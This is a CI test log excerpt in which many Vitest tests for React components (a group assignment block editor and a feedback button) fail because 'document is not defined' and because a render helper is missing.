2025-11-18T17:36:11.3605723Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mrenders basic fields correctly
2025-11-18T17:36:11.3606198Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3607263Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3608141Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m76:7[22m[39m
2025-11-18T17:36:11.3608475Z     [90m 74| [39m  describe('Edit Mode', () => {
2025-11-18T17:36:11.3608896Z     [90m 75| [39m    it('renders basic fields correctly', () => {
2025-11-18T17:36:11.3609166Z     [90m 76| [39m      render(
2025-11-18T17:36:11.3609449Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3609838Z     [90m 77| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3610130Z     [90m 78| [39m          block={defaultBlock}
2025-11-18T17:36:11.3610142Z 
2025-11-18T17:36:11.3610511Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[279/545]⎯[22m[39m
2025-11-18T17:36:11.3610523Z 
2025-11-18T17:36:11.3612387Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows resource buttons
2025-11-18T17:36:11.3612926Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3613700Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3614575Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m92:7[22m[39m
2025-11-18T17:36:11.3614783Z     [90m 90| [39m
2025-11-18T17:36:11.3615132Z     [90m 91| [39m    it('shows resource buttons', () => {
2025-11-18T17:36:11.3615356Z     [90m 92| [39m      render(
2025-11-18T17:36:11.3615608Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3615936Z     [90m 93| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3616236Z     [90m 94| [39m          block={defaultBlock}
2025-11-18T17:36:11.3616261Z 
2025-11-18T17:36:11.3616660Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[280/545]⎯[22m[39m
2025-11-18T17:36:11.3616677Z 
2025-11-18T17:36:11.3618494Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22madds a link resource
2025-11-18T17:36:11.3619014Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3619808Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3620625Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m107:7[22m[39m
2025-11-18T17:36:11.3620806Z     [90m105| [39m
2025-11-18T17:36:11.3621181Z     [90m106| [39m    it('adds a link resource', () => {
2025-11-18T17:36:11.3621427Z     [90m107| [39m      render(
2025-11-18T17:36:11.3621699Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3622058Z     [90m108| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3622365Z     [90m109| [39m          block={defaultBlock}
2025-11-18T17:36:11.3622389Z 
2025-11-18T17:36:11.3622793Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[281/545]⎯[22m[39m
2025-11-18T17:36:11.3622811Z 
2025-11-18T17:36:11.3624449Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22madds a document resource
2025-11-18T17:36:11.3624921Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3625687Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3626553Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m133:7[22m[39m
2025-11-18T17:36:11.3627894Z     [90m131| [39m
2025-11-18T17:36:11.3628312Z     [90m132| [39m    it('adds a document resource', () => {
2025-11-18T17:36:11.3628544Z     [90m133| [39m      render(
2025-11-18T17:36:11.3628783Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3629122Z     [90m134| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3629635Z     [90m135| [39m          block={defaultBlock}
2025-11-18T17:36:11.3629653Z 
2025-11-18T17:36:11.3630069Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[282/545]⎯[22m[39m
2025-11-18T17:36:11.3630087Z 
2025-11-18T17:36:11.3631754Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mdisplays existing resources
2025-11-18T17:36:11.3632290Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3633076Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3633909Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m159:7[22m[39m
2025-11-18T17:36:11.3634103Z     [90m157| [39m
2025-11-18T17:36:11.3634536Z     [90m158| [39m    it('displays existing resources', () => {
2025-11-18T17:36:11.3634792Z     [90m159| [39m      render(
2025-11-18T17:36:11.3635046Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3635420Z     [90m160| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3635791Z     [90m161| [39m          block={blockWithResources}
2025-11-18T17:36:11.3635811Z 
2025-11-18T17:36:11.3636228Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[283/545]⎯[22m[39m
2025-11-18T17:36:11.3636246Z 
2025-11-18T17:36:11.3638084Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mupdates resource fields
2025-11-18T17:36:11.3638556Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3639384Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3640246Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m175:7[22m[39m
2025-11-18T17:36:11.3640478Z     [90m173| [39m
2025-11-18T17:36:11.3640888Z     [90m174| [39m    it('updates resource fields', () => {
2025-11-18T17:36:11.3641142Z     [90m175| [39m      render(
2025-11-18T17:36:11.3641381Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3641714Z     [90m176| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3642043Z     [90m177| [39m          block={blockWithResources}
2025-11-18T17:36:11.3642057Z 
2025-11-18T17:36:11.3642430Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[284/545]⎯[22m[39m
2025-11-18T17:36:11.3642445Z 
2025-11-18T17:36:11.3644044Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mdeletes a resource
2025-11-18T17:36:11.3644822Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3645613Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3646425Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m201:7[22m[39m
2025-11-18T17:36:11.3646628Z     [90m199| [39m
2025-11-18T17:36:11.3647217Z     [90m200| [39m    it('deletes a resource', () => {
2025-11-18T17:36:11.3647486Z     [90m201| [39m      render(
2025-11-18T17:36:11.3647742Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3648104Z     [90m202| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3648468Z     [90m203| [39m          block={blockWithResources}
2025-11-18T17:36:11.3648485Z 
2025-11-18T17:36:11.3648900Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[285/545]⎯[22m[39m
2025-11-18T17:36:11.3648916Z 
2025-11-18T17:36:11.3650664Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mvalidates file upload functionality
2025-11-18T17:36:11.3651121Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3651846Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3652944Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m251:7[22m[39m
2025-11-18T17:36:11.3653196Z     [90m249| [39m      };
2025-11-18T17:36:11.3653377Z     [90m250| [39m
2025-11-18T17:36:11.3653615Z     [90m251| [39m      render(
2025-11-18T17:36:11.3653867Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3654223Z     [90m252| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3654619Z     [90m253| [39m          block={blockWithEmptyDocument}
2025-11-18T17:36:11.3654634Z 
2025-11-18T17:36:11.3655030Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[286/545]⎯[22m[39m
2025-11-18T17:36:11.3655059Z 
2025-11-18T17:36:11.3656972Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows "Cambiar" button when document has URL
2025-11-18T17:36:11.3657434Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3658208Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3659011Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m270:7[22m[39m
2025-11-18T17:36:11.3659191Z     [90m268| [39m
2025-11-18T17:36:11.3659656Z     [90m269| [39m    it('shows "Cambiar" button when document has URL', () => {
2025-11-18T17:36:11.3659886Z     [90m270| [39m      render(
2025-11-18T17:36:11.3660129Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3660466Z     [90m271| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3660812Z     [90m272| [39m          block={blockWithResources}
2025-11-18T17:36:11.3660825Z 
2025-11-18T17:36:11.3661194Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[287/545]⎯[22m[39m
2025-11-18T17:36:11.3661207Z 
2025-11-18T17:36:11.3662861Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows empty state when no resources
2025-11-18T17:36:11.3663335Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3664117Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3664915Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m285:7[22m[39m
2025-11-18T17:36:11.3665102Z     [90m283| [39m
2025-11-18T17:36:11.3665515Z     [90m284| [39m    it('shows empty state when no resources', () => {
2025-11-18T17:36:11.3665753Z     [90m285| [39m      render(
2025-11-18T17:36:11.3666238Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3666583Z     [90m286| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3667089Z     [90m287| [39m          block={defaultBlock}
2025-11-18T17:36:11.3667109Z 
2025-11-18T17:36:11.3667530Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[288/545]⎯[22m[39m
2025-11-18T17:36:11.3667546Z 
2025-11-18T17:36:11.3669320Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows note about resources visibility
2025-11-18T17:36:11.3669855Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3670646Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3671465Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m300:7[22m[39m
2025-11-18T17:36:11.3671655Z     [90m298| [39m
2025-11-18T17:36:11.3672119Z     [90m299| [39m    it('shows note about resources visibility', () => {
2025-11-18T17:36:11.3672412Z     [90m300| [39m      render(
2025-11-18T17:36:11.3672657Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3673015Z     [90m301| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3673337Z     [90m302| [39m          block={defaultBlock}
2025-11-18T17:36:11.3673352Z 
2025-11-18T17:36:11.3673989Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[289/545]⎯[22m[39m
2025-11-18T17:36:11.3674030Z 
2025-11-18T17:36:11.3675846Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mrenders assignment details in preview
2025-11-18T17:36:11.3676309Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3680789Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3681731Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m316:7[22m[39m
2025-11-18T17:36:11.3682119Z     [90m314| [39m  describe('Preview Mode', () => {
2025-11-18T17:36:11.3682604Z     [90m315| [39m    it('renders assignment details in preview', () => {
2025-11-18T17:36:11.3682889Z     [90m316| [39m      render(
2025-11-18T17:36:11.3683163Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3683563Z     [90m317| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3683920Z     [90m318| [39m          block={blockWithResources}
2025-11-18T17:36:11.3683937Z 
2025-11-18T17:36:11.3684328Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[290/545]⎯[22m[39m
2025-11-18T17:36:11.3684342Z 
2025-11-18T17:36:11.3686064Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mshows resources count in preview
2025-11-18T17:36:11.3686570Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3687588Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3688492Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m334:7[22m[39m
2025-11-18T17:36:11.3688690Z     [90m332| [39m
2025-11-18T17:36:11.3689119Z     [90m333| [39m    it('shows resources count in preview', () => {
2025-11-18T17:36:11.3689395Z     [90m334| [39m      render(
2025-11-18T17:36:11.3689678Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3690046Z     [90m335| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3690395Z     [90m336| [39m          block={blockWithResources}
2025-11-18T17:36:11.3690410Z 
2025-11-18T17:36:11.3690810Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[291/545]⎯[22m[39m
2025-11-18T17:36:11.3690825Z 
2025-11-18T17:36:11.3692577Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mdisplays resource list in preview
2025-11-18T17:36:11.3693323Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3694133Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3694995Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m348:7[22m[39m
2025-11-18T17:36:11.3695216Z     [90m346| [39m
2025-11-18T17:36:11.3695694Z     [90m347| [39m    it('displays resource list in preview', () => {
2025-11-18T17:36:11.3695983Z     [90m348| [39m      render(
2025-11-18T17:36:11.3696224Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3696573Z     [90m349| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3697110Z     [90m350| [39m          block={blockWithResources}
2025-11-18T17:36:11.3697129Z 
2025-11-18T17:36:11.3697556Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[292/545]⎯[22m[39m
2025-11-18T17:36:11.3697573Z 
2025-11-18T17:36:11.3699344Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mshows correct icons for resource types
2025-11-18T17:36:11.3699896Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3700674Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3701771Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m363:7[22m[39m
2025-11-18T17:36:11.3701990Z     [90m361| [39m
2025-11-18T17:36:11.3702477Z     [90m362| [39m    it('shows correct icons for resource types', () => {
2025-11-18T17:36:11.3702757Z     [90m363| [39m      render(
2025-11-18T17:36:11.3703024Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3703391Z     [90m364| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3703734Z     [90m365| [39m          block={blockWithResources}
2025-11-18T17:36:11.3703748Z 
2025-11-18T17:36:11.3704166Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[293/545]⎯[22m[39m
2025-11-18T17:36:11.3704184Z 
2025-11-18T17:36:11.3705978Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mdoes not show resources section when empty
2025-11-18T17:36:11.3706500Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3707509Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3708381Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m382:7[22m[39m
2025-11-18T17:36:11.3708588Z     [90m380| [39m
2025-11-18T17:36:11.3709077Z     [90m381| [39m    it('does not show resources section when empty', () => {
2025-11-18T17:36:11.3709326Z     [90m382| [39m      render(
2025-11-18T17:36:11.3709589Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3709976Z     [90m383| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3710321Z     [90m384| [39m          block={defaultBlock}
2025-11-18T17:36:11.3710336Z 
2025-11-18T17:36:11.3710712Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[294/545]⎯[22m[39m
2025-11-18T17:36:11.3710724Z 
2025-11-18T17:36:11.3712599Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mResource Management[2m > [22mhandles save button functionality
2025-11-18T17:36:11.3713108Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3713898Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3714783Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m398:7[22m[39m
2025-11-18T17:36:11.3715157Z     [90m396| [39m  describe('Resource Management', () => {
2025-11-18T17:36:11.3715579Z     [90m397| [39m    it('handles save button functionality', () => {
2025-11-18T17:36:11.3716084Z     [90m398| [39m      render(
2025-11-18T17:36:11.3716358Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3716725Z     [90m399| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3717237Z     [90m400| [39m          block={defaultBlock}
2025-11-18T17:36:11.3717265Z 
2025-11-18T17:36:11.3717656Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[295/545]⎯[22m[39m
2025-11-18T17:36:11.3717672Z 
2025-11-18T17:36:11.3719427Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mResource Management[2m > [22mmaintains resource order
2025-11-18T17:36:11.3719915Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3720691Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3721573Z [36m [2m❯[22m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx:[2m424:7[22m[39m
2025-11-18T17:36:11.3721787Z     [90m422| [39m
2025-11-18T17:36:11.3722195Z     [90m423| [39m    it('maintains resource order', () => {
2025-11-18T17:36:11.3722472Z     [90m424| [39m      render(
2025-11-18T17:36:11.3722747Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3723085Z     [90m425| [39m        <GroupAssignmentBlockEditor
2025-11-18T17:36:11.3723410Z     [90m426| [39m          block={blockWithResources}
2025-11-18T17:36:11.3723430Z 
2025-11-18T17:36:11.3724003Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[296/545]⎯[22m[39m
2025-11-18T17:36:11.3724019Z 
2025-11-18T17:36:11.3725254Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mrenders the floating button
2025-11-18T17:36:11.3725772Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.3726514Z [36m [2m❯[22m __tests__/components/feedback/FeedbackButton.test.tsx:[2m10:11[22m[39m
2025-11-18T17:36:11.3727101Z     [90m  8| [39mdescribe('FeedbackButton', () => {
2025-11-18T17:36:11.3727529Z     [90m  9| [39m  it('renders the floating button', async () => {
2025-11-18T17:36:11.3727911Z     [90m 10| [39m    await renderWithAct(<FeedbackButton />);
2025-11-18T17:36:11.3728158Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.3728749Z     [90m 11| [39m    const button = screen.getByRole('button', { name: /enviar feedback…
2025-11-18T17:36:11.3729157Z     [90m 12| [39m    expect(button).toBeInTheDocument();
2025-11-18T17:36:11.3729174Z 
2025-11-18T17:36:11.3729574Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[297/545]⎯[22m[39m
2025-11-18T17:36:11.3729586Z 
2025-11-18T17:36:11.3730820Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mhas correct styling classes
2025-11-18T17:36:11.3731351Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.3732047Z [36m [2m❯[22m __tests__/components/feedback/FeedbackButton.test.tsx:[2m16:11[22m[39m
2025-11-18T17:36:11.3732238Z     [90m 14| [39m
2025-11-18T17:36:11.3732663Z     [90m 15| [39m  it('has correct styling classes', async () => {
2025-11-18T17:36:11.3733080Z     [90m 16| [39m    await renderWithAct(<FeedbackButton />);
2025-11-18T17:36:11.3733365Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.3733761Z     [90m 17| [39m    const button = screen.getByRole('button');
2025-11-18T17:36:11.3734356Z     [90m 18| [39m    expect(button).toHaveClass('fixed', 'bottom-6', 'right-6', 'z-40');
2025-11-18T17:36:11.3734377Z 
2025-11-18T17:36:11.3734806Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[298/545]⎯[22m[39m
2025-11-18T17:36:11.3734824Z 
2025-11-18T17:36:11.3736112Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mcontains the MessageCircle icon
2025-11-18T17:36:11.3736587Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.3737479Z [36m [2m❯[22m __tests__/components/feedback/FeedbackButton.test.tsx:[2m23:33[22m[39m
2025-11-18T17:36:11.3737921Z     [90m 21| [39m
2025-11-18T17:36:11.3738324Z     [90m 22| [39m  it('contains the MessageCircle icon', async () => {
2025-11-18T17:36:11.3738811Z     [90m 23| [39m    const { container } = await renderWithAct(<FeedbackButton />);
2025-11-18T17:36:11.3739172Z     [90m   | [39m                                [31m^[39m
2025-11-18T17:36:11.3739620Z     [90m 24| [39m    const icon = container.querySelector('svg');
2025-11-18T17:36:11.3740275Z     [90m 25| [39m    expect(icon).toBeInTheDocument();
2025-11-18T17:36:11.3740302Z 
2025-11-18T17:36:11.3740691Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[299/545]⎯[22m[39m
2025-11-18T17:36:11.3740706Z 
2025-11-18T17:36:11.3741997Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mopens feedback modal when clicked
2025-11-18T17:36:11.3742519Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.3743281Z [36m [2m❯[22m __tests__/components/feedback/FeedbackButton.test.tsx:[2m30:11[22m[39m
2025-11-18T17:36:11.3743524Z     [90m 28| [39m
2025-11-18T17:36:11.3743991Z     [90m 29| [39m  it('opens feedback modal when clicked', async () => {
2025-11-18T17:36:11.3744415Z     [90m 30| [39m    await renderWithAct(<FeedbackButton />);
2025-11-18T17:36:11.3744698Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.3745353Z     [90m 31| [39m    const button = screen.getByRole('button');
2025-11-18T17:36:11.3745601Z     [90m 32| [39m    
2025-11-18T17:36:11.3745620Z 
2025-11-18T17:36:11.3746038Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[300/545]⎯[22m[39m
2025-11-18T17:36:11.3746054Z 
2025-11-18T17:36:11.3747462Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mhas pulse animation class
2025-11-18T17:36:11.3747955Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.3749678Z [36m [2m❯[22m __tests__/components/feedback/FeedbackButton.test.tsx:[2m47:11[22m[39m
2025-11-18T17:36:11.3749889Z     [90m 45| [39m
2025-11-18T17:36:11.3750559Z     [90m 46| [39m  it('has pulse animation class', async () => {
2025-11-18T17:36:11.3751138Z     [90m 47| [39m    await renderWithAct(<FeedbackButton />);
2025-11-18T17:36:11.3751588Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.3752015Z     [90m 48| [39m    const button = screen.getByRole('button');
2025-11-18T17:36:11.3752460Z     [90m 49| [39m    expect(button).toHaveClass('animate-pulse');
2025-11-18T17:36:11.3752477Z 
